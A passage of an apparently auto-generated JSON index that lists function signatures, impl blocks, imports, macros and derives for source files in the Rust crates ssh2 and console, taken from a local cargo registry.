          "#[derive(Copy, Clone)]"
        ],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/error.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(err: Error) -> io::Error {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn description(&self) -> &str {",
          "fn from(_: NulError) -> Error {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Display for ErrorCode {",
          "impl Error {",
          "impl From<Error> for io::Error {",
          "impl fmt::Display for Error {",
          "impl error::Error for Error {",
          "impl From<NulError> for Error {"
        ],
        "uses": [
          "use libc;",
          "use std::borrow::Cow;",
          "use std::error;",
          "use std::ffi::NulError;",
          "use std::fmt;",
          "use std::io;",
          "use std::ptr::null_mut;",
          "use std::str;",
          "use {raw, Session};"
        ],
        "macros": [
          "write!(f, \"{:?}\", self)",
          "write!(f, \"[{}] {}\", self.code, self.msg)"
        ],
        "derives": [
          "#[derive(Debug, Copy, Clone, PartialEq, Eq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/lib.rs",
        "function_defs": [
          "fn from(host_type: HostKeyType) -> KnownHostKeyFormat {",
          "fn from(op: PtyModeOpcode) -> ExtensiblePtyModeOpcode {",
          "fn from(op: u8) -> ExtensiblePtyModeOpcode {",
          "fn as_opcode(&self) -> u8 {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl From<HostKeyType> for KnownHostKeyFormat {",
          "impl From<PtyModeOpcode> for ExtensiblePtyModeOpcode {",
          "impl From<u8> for ExtensiblePtyModeOpcode {",
          "impl ExtensiblePtyModeOpcode {",
          "impl PtyModes {"
        ],
        "uses": [
          "use std::ffi::CStr;",
          "use session::SessionInner;"
        ],
        "macros": [
          "//!     println!(\"{}\", identity.comment());",
          "//! assert!(sess.authenticated());",
          "//! assert!(sess.authenticated());",
          "//! println!(\"{}\", s);",
          "//! println!(\"{}\", channel.exit_status().unwrap());",
          "//! println!(\"remote file size: {}\", stat.size());",
          "//!             println!(\"Found netconf 1.0 terminator, breaking read loop\");",
          "//!             println!(\"Found netconf 1.1 terminator, breaking read loop\");",
          "//!             println!(\"Buffer is empty, SSH channel read terminated\");",
          "//!     println!(\"Result from connection:\\n{}\", result);",
          "//!     let payload = format!(\"{}\\n#{}\\n{}\\n##\\n\", HELLO, PAYLOAD.len(), PAYLOAD",
          "//!     println!(\"Written {} bytes payload\", a);",
          "//!     println!(\"Result from payload execution:\\n{}\", result);"
        ],
        "derives": [
          "#[derive(Copy, Clone)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Copy, Clone)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Copy, Clone, Debug)]",
          "#[derive(Debug, Clone, Copy, Eq, PartialEq)]",
          "#[derive(Debug, Clone, Copy, Eq, PartialEq)]",
          "#[derive(Debug, Clone)]"
        ],
        "error_handling": 61
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/knownhosts.rs",
        "function_defs": [
          "fn resolve_to_raw_host(",
          "fn check_port_(&self, host: &str, port: i32, key: &[u8]) -> CheckResult {",
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl KnownHosts {",
          "impl Drop for KnownHosts {",
          "impl Host {"
        ],
        "uses": [
          "use libc::{c_int, size_t};",
          "use parking_lot::{Mutex, MutexGuard};",
          "use std::ffi::CString;",
          "use std::path::Path;",
          "use std::ptr::null_mut;",
          "use std::str;",
          "use std::sync::Arc;",
          "use util;",
          "use {raw, CheckResult, Error, ErrorCode, KnownHostFileKind, SessionInner};"
        ],
        "macros": [
          "///             panic!(\"host mismatch, man in the middle attack?!\")",
          "///         CheckResult::Failure => panic!(\"failed to check the known hosts\"),",
          "///     println!(\"adding {} to the known hosts\", host);"
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 26
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/listener.rs",
        "function_defs": [
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Listener {",
          "impl Drop for Listener {"
        ],
        "uses": [
          "use parking_lot::Mutex;",
          "use std::sync::Arc;",
          "use {raw, Channel, Error, SessionInner};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/sftp.rs",
        "function_defs": [
          "fn readlink_op(&self, path: &Path, op: c_int) -> Result<PathBuf, Error> {",
          "fn lock(&self) -> Result<LockedSftp, Error> {",
          "fn error_code_into_error(",
          "fn error_code_into_result(",
          "fn rc(locked: &LockedSftp, rc: libc::c_int) -> Result<(), Error> {",
          "fn drop(&mut self) {",
          "fn lock(&self) -> Result<LockedFile, Error> {",
          "fn rc(&self, locked: &LockedFile, rc: libc::c_int) -> Result<(), Error> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn seek(&mut self, how: SeekFrom) -> io::Result<u64> {",
          "fn drop(&mut self) {",
          "fn val<T: Copy>(raw: &raw::LIBSSH2_SFTP_ATTRIBUTES, t: &T, flag: c_ulong) -> Option<T> {",
          "fn flag<T>(o: &Option<T>, flag: c_ulong) -> c_ulong {",
          "fn from_perm(perm: c_ulong) -> Self {",
          "fn mkpath(v: Vec<u8>) -> PathBuf {",
          "fn mkpath(v: Vec<u8>) -> PathBuf {"
        ],
        "struct_defs": [
          "struct SftpInnerDropWrapper(Option<SftpInner>);",
          "struct SftpInner {",
          "struct LockedSftp<'sftp> {",
          "struct FileInner {",
          "struct LockedFile<'file> {"
        ],
        "impl_blocks": [
          "impl Sftp {",
          "impl Drop for SftpInnerDropWrapper {",
          "impl File {",
          "impl Read for File {",
          "impl Write for File {",
          "impl Seek for File {",
          "impl Drop for File {",
          "impl FileStat {",
          "impl FileType {"
        ],
        "uses": [
          "use libc::{c_int, c_long, c_uint, c_ulong, size_t};",
          "use parking_lot::{Mutex, MutexGuard};",
          "use std::convert::TryFrom;",
          "use std::ffi::CString;",
          "use std::io::prelude::*;",
          "use std::io::{self, ErrorKind, SeekFrom};",
          "use std::mem;",
          "use std::path::{Path, PathBuf};",
          "use std::ptr::null_mut;",
          "use std::sync::Arc;",
          "use util;",
          "use {raw, Error, ErrorCode, SessionInner};",
          "use std::ffi::OsStr;",
          "use std::os::unix::prelude::*;",
          "use std::str;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug, Clone, Eq, PartialEq)]",
          "#[derive(PartialEq)]",
          "#[derive(PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Clone, Copy)]",
          "#[derive(PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Clone, Copy)]",
          "#[derive(Copy, Clone)]"
        ],
        "error_handling": 45
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/agent.rs",
        "function_defs": [
          "fn resolve_raw_identity(",
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Agent {",
          "impl Drop for Agent {",
          "impl PublicKey {"
        ],
        "uses": [
          "use parking_lot::{Mutex, MutexGuard};",
          "use std::ffi::{CStr, CString};",
          "use std::ptr::null_mut;",
          "use std::slice;",
          "use std::str;",
          "use std::sync::Arc;",
          "use {raw, Error, ErrorCode, SessionInner};"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/session.rs",
        "function_defs": [
          "fn session_is_send() {",
          "fn must_be_send<T: Send>(_: &T) -> bool {",
          "fn smoke() {",
          "fn smoke_handshake() {",
          "fn smoke_userauth_banner() {",
          "fn keyboard_interactive() {",
          "fn prompt<'a>(",
          "fn keepalive() {",
          "fn scp_recv() {",
          "fn scp_send() {",
          "fn block_directions() {"
        ],
        "struct_defs": [
          "struct Prompter {"
        ],
        "impl_blocks": [
          "impl KeyboardInteractivePrompt for Prompter {"
        ],
        "uses": [
          "use std::env;",
          "use std::fs::File;",
          "use std::io::{self, prelude::*};",
          "use std::path::Path;",
          "use tempfile::TempDir;",
          "use ssh2::{BlockDirections, HashType, KeyboardInteractivePrompt, MethodType, Prompt, Session};"
        ],
        "macros": [
          "assert!(must_be_send(&sess));",
          "assert!(sess.banner_bytes().is_none());",
          "assert!(sess.is_blocking());",
          "assert_eq!(sess.timeout(), 0);",
          "assert!(sess.host_key().is_none());",
          "assert!(sess.methods(MethodType::Kex).is_none());",
          "assert!(methods.contains(\"publickey\"), \"{}\", methods);",
          "assert!(!sess.authenticated());",
          "assert!(sess.authenticated());",
          "assert_eq!(banner, \"Authorized access only!\");",
          "assert!(",
          "assert!(!sess.authenticated());",
          "assert_eq!(self.some_data, 42);",
          "eprintln!(\"username: {}\", username);",
          "eprintln!(\"instructions: {}\", instructions);",
          "eprintln!(\"prompts: {:?}\", prompts);",
          "// assert_eq!(username, env::var(\"USER\").unwrap());",
          "// assert!(!instructions.is_empty());",
          "assert_eq!(prompts.len(), 1);",
          "assert!(prompts[0].text.contains(\"sword\"));",
          "assert_eq!(prompts[0].echo, false);",
          "assert!(!prompts.is_empty());",
          "Ok(_) => eprintln!(\"auth succeeded somehow(!)\"),",
          "Err(err) => eprintln!(\"auth failed as expected: {}\", err),",
          "assert!(!sess.authenticated());",
          "let p = Path::new(file!()).canonicalize().unwrap();",
          "assert!(data == expected);",
          "assert_eq!(actual, b\"foobar\");",
          "assert_eq!(actual, Err(io::ErrorKind::WouldBlock));",
          "assert_eq!(sess.block_directions(), BlockDirections::Inbound);"
        ],
        "derives": [],
        "error_handling": 43
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/channel.rs",
        "function_defs": [
          "fn consume_stdio(channel: &mut Channel) -> (String, String) {",
          "fn smoke() {",
          "fn must_be_send<T: Send>(_: &T) -> bool {",
          "fn agent_forward() {",
          "fn bad_smoke() {",
          "fn reading_data() {",
          "fn handle_extended_data() {",
          "fn writing_data() {",
          "fn eof() {",
          "fn shell() {",
          "fn setenv() {",
          "fn direct() {",
          "fn direct_stream_local() {",
          "fn forward() {",
          "fn drop_nonblocking() {",
          "fn nonblocking_before_exit_code() {",
          "fn exit_code_ignores_other_errors() {",
          "fn pty_modes_are_propagated() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use ssh2::Channel;",
          "use std::io::prelude::*;",
          "use std::net::{TcpListener, TcpStream};",
          "use std::thread;",
          "use std::os::unix::net::UnixListener;",
          "use std::thread;",
          "use std::time::Duration;"
        ],
        "macros": [
          "eprintln!(\"stdout: {}\", stdout);",
          "eprintln!(\"stderr: {}\", stderr);",
          "assert!(must_be_send(&channel));",
          "assert!(must_be_send(&channel.stream(0)));",
          "assert!(channel.eof());",
          "assert_eq!(channel.exit_status().unwrap(), 0);",
          "assert!(channel.eof());",
          "assert_ne!(output, \"\");",
          "assert_ne!(output, std::env::var(\"SSH_AUTH_SOCK\").unwrap());",
          "assert!(channel.eof());",
          "assert_eq!(channel.exit_status().unwrap(), 1);",
          "assert!(channel.eof());",
          "assert_eq!(output, \"foo\\n\");",
          "assert!(output.ends_with(\"foo\\n\"));",
          "assert_eq!(output, \"foo\\n\");",
          "assert_eq!(output, \"\");",
          "eprintln!(\"requesting pty\");",
          "eprintln!(\"shell\");",
          "eprintln!(\"close\");",
          "eprintln!(\"done\");",
          "assert_eq!(b, [1, 2, 3]);",
          "assert_eq!(r, [4, 5, 6]);",
          "assert_eq!(b, [1, 2, 3]);",
          "assert_eq!(r, [4, 5, 6]);",
          "assert_eq!(b, [1, 2, 3]);",
          "assert_eq!(r, [4, 5, 6]);",
          "assert!(channel.read_to_string(&mut output).is_err());",
          "assert!(channel.read_to_string(&mut output).is_ok());",
          "assert_eq!(output, \"foo\\n\");",
          "assert!(channel.exit_status().unwrap() == 0);",
          "assert!(sess.disconnect(None, &longdescription, None).is_err()); // max len == 2",
          "assert!(channel.exit_status().unwrap() == 0);",
          "eprintln!(\"requesting pty\");",
          "assert!(out.contains(\"intr = y\"), \"mode was propagated\");"
        ],
        "derives": [],
        "error_handling": 86
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/knownhosts.rs",
        "function_defs": [
          "fn smoke() {",
          "fn reading() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use ssh2::{KnownHostFileKind, Session};"
        ],
        "macros": [
          "assert_eq!(hosts.len(), 0);",
          "assert_eq!(hosts.len(), 1);",
          "assert_eq!(host.name(), None);",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/sftp.rs",
        "function_defs": [
          "fn smoke() {",
          "fn ops() {",
          "fn not_found() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs::{self, File};",
          "use std::io::prelude::*;",
          "use tempfile::TempDir;"
        ],
        "macros": [
          "assert!(fs::metadata(&td.path().join(\"bar2\"))",
          "assert_eq!(v, b\"foo\");",
          "assert_eq!(sftp.stat(&td.path().join(\"foo\")).unwrap().size, Some(0));",
          "assert_eq!(v, Vec::new());",
          "assert!(readlink == td.path().join(\"foo\"));",
          "assert_eq!(realpath, td.path().join(\"foo\").canonicalize().unwrap());",
          "assert_eq!(f1, f2);",
          "assert_eq!(err.to_string(), \"[SFTP(2)] no such file\");",
          "assert_eq!(io_err.kind(), std::io::ErrorKind::NotFound);",
          "assert_eq!(io_err.to_string(), \"no such file\");",
          "assert_eq!(err.to_string(), \"[SFTP(2)] no such file\");",
          "assert_eq!(io_err.kind(), std::io::ErrorKind::NotFound);",
          "assert_eq!(io_err.to_string(), \"no such file\");"
        ],
        "derives": [],
        "error_handling": 26
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/main.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::env;",
          "use std::net::TcpStream;"
        ],
        "macros": [
          "let addr = format!(\"127.0.0.1:{}\", port);",
          "assert!(!sess.authenticated());",
          "assert!(sess.authenticated());"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/tests/all/agent.rs",
        "function_defs": [
          "fn smoke() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use ssh2::Session;"
        ],
        "macros": [
          "assert!(agent.userauth(\"foo\", &i1).is_err());"
        ],
        "derives": [],
        "error_handling": 6
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11",
    "name": "console-0.15.11",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/examples/term.rs",
        "function_defs": [
          "fn do_stuff() -> io::Result<()> {",
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::{self, Write};",
          "use std::thread;",
          "use std::time::Duration;",
          "use console::{style, Term};"
        ],
        "macros": [
          "term.write_line(&format!(\"Counting {}/10\", style(x + 1).cyan()))?;",
          "writeln!(&term, \"Hello World!\")?;",
          "write!(&term, \"To edit: \")?;",
          "writeln!(&term, \"\\n{}\", res)?;"
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/examples/colors256.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use console::style;"
        ],
        "macros": [
          "print!(\"{:03} \", style(i).color256(i));",
          "println!();",
          "print!(\"{:03} \", style(i).black().on_color256(i));",
          "println!();"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/examples/colors.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use console::style;"
        ],
        "macros": [
          "println!(",
          "println!(\"This is reversed: [{}]\", style(\"whatever\").reverse());",
          "println!(\"This is cyan: {}\", style(\"whatever\").cyan());",
          "eprintln!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/examples/keyboard.rs",
        "function_defs": [
          "fn main() -> io::Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io;",
          "use console::{Key, Term};"
        ],
        "macros": [
          "term.write_line(&format!(\"You pressed {:?}\", key))?;"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/examples/cursor_at.rs",
        "function_defs": [
          "fn write_chars() -> io::Result<()> {",
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io;",
          "use std::thread;",
          "use std::time::Duration;",
          "use console::{style, Term};"
        ],
        "macros": [
          "format!(\"{}\", style(x % 10).black().on_red())",
          "format!(\"{}\", style(x % 10).red().on_black())"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/benches/ansi_parser.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use console::{strip_ansi_codes, AnsiCodeIterator};",
          "use criterion::{black_box, criterion_group, criterion_main, Criterion, Throughput};",
          "use std::{fs, path::Path};"
        ],
        "macros": [
          "criterion_group!(throughput, parse_throughput);",
          "criterion_main!(throughput);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/common_term.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io;",
          "use crate::term::Term;"
        ],
        "macros": [
          "out.write_str(&format!(\"\\x1b[{}B\", n))",
          "out.write_str(&format!(\"\\x1b[{}A\", n))",
          "out.write_str(&format!(\"\\x1b[{}D\", n))",
          "out.write_str(&format!(\"\\x1b[{}C\", n))",
          "out.write_str(&format!(\"\\x1B[{};{}H\", y + 1, x + 1))",
          "out.write_str(&format!(\"\\x1b[{}D\\x1b[0K\", n))"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/term.rs",
        "function_defs": [
          "fn with_inner(inner: TermInner) -> Term {",
          "fn read_line_internal(slf: &Term, initial: &str) -> io::Result<String> {",
          "fn write_through(&self, bytes: &[u8]) -> io::Result<()> {",
          "fn write_through(&self, bytes: &[u8]) -> io::Result<()> {",
          "fn as_raw_fd(&self) -> RawFd {",
          "fn as_raw_handle(&self) -> RawHandle {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {"
        ],
        "struct_defs": [
          "struct TermInner {"
        ],
        "impl_blocks": [
          "impl TermFeatures<'_> {",
          "impl Term {",
          "impl AsRawFd for Term {",
          "impl AsRawHandle for Term {",
          "impl Write for Term {",
          "impl Write for &Term {",
          "impl Read for Term {",
          "impl Read for &Term {"
        ],
        "uses": [
          "use std::fmt::{Debug, Display};",
          "use std::io::{self, Read, Write};",
          "use std::sync::{Arc, Mutex, RwLock};",
          "use std::os::fd::{AsRawFd, RawFd};",
          "use std::os::windows::io::{AsRawHandle, RawHandle};",
          "use crate::{kb::Key, utils::Style};",
          "use windows_sys::Win32::System::Console::{"
        ],
        "macros": [
          "None => self.write_through(format!(\"{}\\n{}\", s, prompt.as_str()).as_bytes()),",
          "slf.write_through(format!(\"\\n{}\", initial).as_bytes())?;"
        ],
        "derives": [
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Copy, Clone, PartialEq, Eq)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 46
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! println!(\"This is {} neat\", style(\"quite\").cyan());",
          "//! println!(\"This is {} neat\", cyan.apply_to(\"quite\"));"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/unix_term.rs",
        "function_defs": [
          "fn c_result<F: FnOnce() -> libc::c_int>(f: F) -> io::Result<()> {",
          "fn buffered() -> io::Result<Self> {",
          "fn unbuffered() -> io::Result<Self> {",
          "fn read_line(&mut self, buf: &mut String) -> io::Result<usize> {",
          "fn as_raw_fd(&self) -> RawFd {",
          "fn as_raw_fd(&self) -> RawFd {",
          "fn poll_fd(fd: RawFd, timeout: i32) -> io::Result<bool> {",
          "fn select_fd(fd: RawFd, timeout: i32) -> io::Result<bool> {",
          "fn select_or_poll_term_fd(fd: RawFd, timeout: i32) -> io::Result<bool> {",
          "fn read_single_char(fd: RawFd) -> io::Result<Option<char>> {",
          "fn read_bytes(fd: RawFd, buf: &mut [u8], count: u8) -> io::Result<u8> {",
          "fn read_single_key_impl(fd: RawFd) -> Result<Key, io::Error> {",
          "fn key_from_utf8(buf: &[u8]) -> Key {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Input<BufReader<fs::File>> {",
          "impl Input<fs::File> {",
          "impl AsRawFd for Input<fs::File> {",
          "impl AsRawFd for Input<BufReader<fs::File>> {"
        ],
        "uses": [
          "use std::env;",
          "use std::fmt::Display;",
          "use std::fs;",
          "use std::io::{self, BufRead, BufReader};",
          "use std::mem;",
          "use std::os::fd::{AsRawFd, RawFd};",
          "use std::str;",
          "use once_cell::sync::Lazy;",
          "use crate::kb::Key;",
          "use crate::term::Term;"
        ],
        "macros": [
          "print!(\"\\x1b]0;{}\\x07\", title);"
        ],
        "derives": [],
        "error_handling": 28
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/kb.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [
          "#[derive(Clone, PartialEq, Eq, Debug, Hash)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/ansi.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn is_final(&self) -> bool {",
          "fn is_trapped(&self) -> bool {",
          "fn transition(&mut self, c: char) {",
          "fn new(s: &'a str) -> Self {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn find_ansi_code_exclusive(it: &mut Peekable<CharIndices>) -> Option<(usize, usize)> {",
          "fn next(&mut self) -> Option<(&'a str, bool)> {",
          "fn eq(&self, other: &Match<'a>) -> bool {",
          "fn dfa_matches_old_regex(s in r\"([\\x1b\\x9b]?.*){0,5}\") {",
          "fn dfa_matches_regex_on_small_strings() {",
          "fn check_all_strings_of_len(len: usize) {",
          "fn _check_all_strings_of_len(len: usize, chunk: &mut Vec<u8>) {",
          "fn complex_data() {",
          "fn state_machine() {",
          "fn back_to_back_entry_char() {",
          "fn early_paren_can_use_many_chars() {",
          "fn long_run_of_digits() {",
          "fn test_ansi_iter_re_vt100() {",
          "fn test_ansi_iter_re() {",
          "fn test_ansi_iter_re_on_multi() {"
        ],
        "struct_defs": [
          "struct Matches<'a> {",
          "struct Match<'a> {"
        ],
        "impl_blocks": [
          "impl Default for State {",
          "impl State {",
          "impl FusedIterator for Matches<'_> {}",
          "impl FusedIterator for AnsiCodeIterator<'_> {}"
        ],
        "uses": [
          "use std::{",
          "use super::*;",
          "use once_cell::sync::Lazy;",
          "use proptest::prelude::*;",
          "use regex::Regex;",
          "use crate::style;",
          "use crate::style;"
        ],
        "macros": [
          "assert_eq!(old_matches, new_matches);",
          "assert_eq!(old_matches, new_matches);",
          "assert_eq!(old_matches, new_matches);",
          "assert!(!state.is_final());",
          "assert!(state.is_final());",
          "assert!(state.is_trapped());",
          "assert_eq!(&[\"\\x1bf\"], matches.as_slice());",
          "assert_eq!(&[s], matches.as_slice());",
          "assert_eq!(&[s], matches.as_slice());",
          "assert_eq!(iter.next(), Some((\"\\x1b(0\", true)));",
          "assert_eq!(iter.next(), Some((\"lpq\", false)));",
          "assert_eq!(iter.next(), Some((\"\\x1b)B\", true)));",
          "assert_eq!(iter.next(), Some((\"english\", false)));",
          "let s = format!(\"Hello {}!\", style(\"World\").red().force_styling(true));",
          "assert_eq!(iter.next(), Some((\"Hello \", false)));",
          "assert_eq!(iter.current_slice(), \"Hello \");",
          "assert_eq!(iter.rest_slice(), \"\\x1b[31mWorld\\x1b[0m!\");",
          "assert_eq!(iter.next(), Some((\"\\x1b[31m\", true)));",
          "assert_eq!(iter.current_slice(), \"Hello \\x1b[31m\");",
          "assert_eq!(iter.rest_slice(), \"World\\x1b[0m!\");",
          "assert_eq!(iter.next(), Some((\"World\", false)));",
          "assert_eq!(iter.current_slice(), \"Hello \\x1b[31mWorld\");",
          "assert_eq!(iter.rest_slice(), \"\\x1b[0m!\");",
          "assert_eq!(iter.next(), Some((\"\\x1b[0m\", true)));",
          "assert_eq!(iter.current_slice(), \"Hello \\x1b[31mWorld\\x1b[0m\");",
          "assert_eq!(iter.rest_slice(), \"!\");",
          "assert_eq!(iter.next(), Some((\"!\", false)));",
          "assert_eq!(iter.current_slice(), \"Hello \\x1b[31mWorld\\x1b[0m!\");",
          "assert_eq!(iter.rest_slice(), \"\");",
          "assert_eq!(iter.next(), None);",
          "let s = format!(\"{}\", style(\"a\").red().bold().force_styling(true));",
          "assert_eq!(iter.next(), Some((\"\\x1b[31m\", true)));",
          "assert_eq!(iter.current_slice(), \"\\x1b[31m\");",
          "assert_eq!(iter.rest_slice(), \"\\x1b[1ma\\x1b[0m\");",
          "assert_eq!(iter.next(), Some((\"\\x1b[1m\", true)));",
          "assert_eq!(iter.current_slice(), \"\\x1b[31m\\x1b[1m\");",
          "assert_eq!(iter.rest_slice(), \"a\\x1b[0m\");",
          "assert_eq!(iter.next(), Some((\"a\", false)));",
          "assert_eq!(iter.current_slice(), \"\\x1b[31m\\x1b[1ma\");",
          "assert_eq!(iter.rest_slice(), \"\\x1b[0m\");",
          "assert_eq!(iter.next(), Some((\"\\x1b[0m\", true)));",
          "assert_eq!(iter.current_slice(), \"\\x1b[31m\\x1b[1ma\\x1b[0m\");",
          "assert_eq!(iter.rest_slice(), \"\");",
          "assert_eq!(iter.next(), None);"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 21
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/wasm_term.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fmt::Display;",
          "use std::io;",
          "use crate::kb::Key;",
          "use crate::term::Term;",
          "use std::os::fd::AsRawFd;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/utils.rs",
        "function_defs": [
          "fn strip_ansi_codes(s: &str) -> &str {",
          "fn default_colors_enabled(out: &Term) -> bool {",
          "fn ansi_num(self) -> usize {",
          "fn is_color256(self) -> bool {",
          "fn ansi_num(self) -> usize {",
          "fn default() -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
